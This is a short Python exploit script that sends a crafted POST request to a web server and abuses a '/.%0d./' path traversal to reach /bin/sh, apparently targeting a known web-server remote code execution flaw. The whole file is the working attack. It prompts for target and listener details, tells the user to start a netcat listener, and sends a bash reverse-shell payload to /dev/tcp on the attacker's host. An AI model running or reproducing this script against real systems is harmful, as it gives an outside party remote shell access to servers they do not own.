import sys
import time
import socket
from urllib.parse import urlparse

host=input("Enter the address of the target (127.0.0.1)\n")
host_port=input("Enter the port of the target (80,443)\n")
lhost= input("Your LHOST:")
lport= input("Your LPORT:")
host = urlparse(host).netloc
print(f"""
--------------------------------------
Target     : {host}
Target Port: {host_port}
LHOST	   : {lhost}
LPORT      : {lport}
--------------------------------------
""")
choose = input("Is this correct? [y/n]:")
if choose == "y" or choose == "Y":
	print(f'\n\nOpen a new terminal and execute "nc -lnvp {lport}"')
	time.sleep(2)
	choose2 = input("\n\nDid you start you listener? [y/n]")
	if choose2 == 'y' or choose2 =='Y':
		soc = socket.socket()
		soc.connect((host, int(host_port)))
		payload = f'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\nbash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" 2>&1'.encode()
		soc.send(payload)
		resp=""
		connection = soc.recv(1024)
		if len(connection) == 0:
			sys.exit()
		resp+=connection.decode()
		print(resp)
	else:
		print("Start your listener and try again..")
		time.sleep(0.5)
		sys.exit()
else:
	print("Exiting..")
	time.sleep(0.5)
	sys.exit()
